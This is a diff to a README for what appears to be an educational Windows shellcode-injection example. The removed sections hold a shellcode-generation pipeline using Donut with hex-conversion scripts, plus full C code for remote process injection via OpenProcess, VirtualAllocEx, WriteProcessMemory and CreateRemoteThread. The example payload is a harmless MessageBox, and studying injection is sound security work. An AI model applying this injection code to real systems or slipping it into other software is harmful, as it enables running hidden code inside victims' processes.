@@ -132,39 +132,6 @@ VirtualFree(HandleMemory, 0, MEM_RELEASE);
 
 ---
 
-## Building
-
-### Build with MSVC (Visual Studio Developer Command Prompt)
-
-```cmd
-cl /nologo "Classic Injection.C" user32.lib
-```
-
-This produces `Classic Injection.exe` in the current directory.
-
-### Build with MinGW (gcc)
-
-```bash
-gcc -o "Classic Injection.exe" "Classic Injection.C"
-```
-
-### Build with CMake (if available)
-
-```bash
-cmake .
-cmake --build .
-```
-
----
-
-## Running
-
-### Execute the Program
-
-```powershell
-.\Classic\ Injection.exe
-```
-
 ### Expected Output
 
 ```
@@ -184,59 +151,6 @@ The output depends on the shellcode payload:
 ## Generating Shellcode
 
 The `shellcode` array in the code must be filled with actual machine code bytes. You can use **Donut** (as documented in [../Shellcode/README.md](../Shellcode/README.md)) to generate shellcode:
-
-### Step 1: Create a Payload PE
-
-Build a simple C program (e.g., MessageBox):
-
-```c
-#include <windows.h>
-
-int main() {
-    MessageBoxA(NULL, "Injected Code!", "Success", MB_OK);
-    return 0;
-}
-```
-
-Compile:
-```bash
-gcc -o payload.exe payload.c -luser32
-```
-
-### Step 2: Convert to Shellcode with Donut
-
-```powershell
-donut.exe -i payload.exe -o payload.bin -z 2 -k 2 -e 3 -b 1
-```
-
-### Step 3: Convert Binary to Hex Format
-
-**PowerShell:**
-```powershell
-$bytes = [System.IO.File]::ReadAllBytes('payload.bin')
-$hex = -join ($bytes | ForEach-Object { '0x' + $_.ToString('X2') + ',' })
-Write-Output $hex
-```
-
-**Python:**
-```python
-with open('payload.bin', 'rb') as f:
-    data = f.read()
-    hex_str = ', '.join([f'0x{byte:02x}' for byte in data])
-    print(hex_str)
-```
-
-### Step 4: Insert into Code
-
-Replace the empty shellcode array:
-
-```c
-unsigned char shellcode[] = {
-    0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 
-    0x0e, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,
-    // ... rest of bytes ...
-};
-```
 
 ---
 
@@ -313,59 +227,6 @@ unsigned char shellcode[] = {
 ✗ **Requires shellcode** – Must have valid position-independent code
 ✗ **Detectable** – Creates obvious artifacts (allocated executable memory, unexpected threads)
 ✗ **No stealth** – EDR/AV may easily detect this pattern
-
----
-
-## Extending to Remote Injection
-
-To inject into **another process** instead of self-injection:
-
-```c
-// 1. Open target process
-HANDLE hProcess = OpenProcess(
-    PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
-    FALSE,
-    targetPID
-);
-
-// 2. Allocate memory in target process
-LPVOID remoteBuffer = VirtualAllocEx(
-    hProcess,
-    NULL,
-    sizeof(shellcode),
-    MEM_COMMIT,
-    PAGE_EXECUTE_READWRITE
-);
-
-// 3. Write shellcode to target process
-WriteProcessMemory(
-    hProcess,
-    remoteBuffer,
-    shellcode,
-    sizeof(shellcode),
-    NULL
-);
-
-// 4. Create thread in target process
-HANDLE hRemoteThread = CreateRemoteThread(
-    hProcess,
-    NULL,
-    0,
-    (LPTHREAD_START_ROUTINE)remoteBuffer,
-    NULL,
-    0,
-    NULL
-);
-
-// 5. Cleanup
-CloseHandle(hRemoteThread);
-CloseHandle(hProcess);
-```
-
-**Key Differences:**
-- Use `OpenProcess()` to get a handle to the target process
-- Use `VirtualAllocEx()` instead of `VirtualAlloc()` (specify target process)
-- Use `CreateRemoteThread()` instead of `CreateThread()` (specify target process)
 
 ---
 
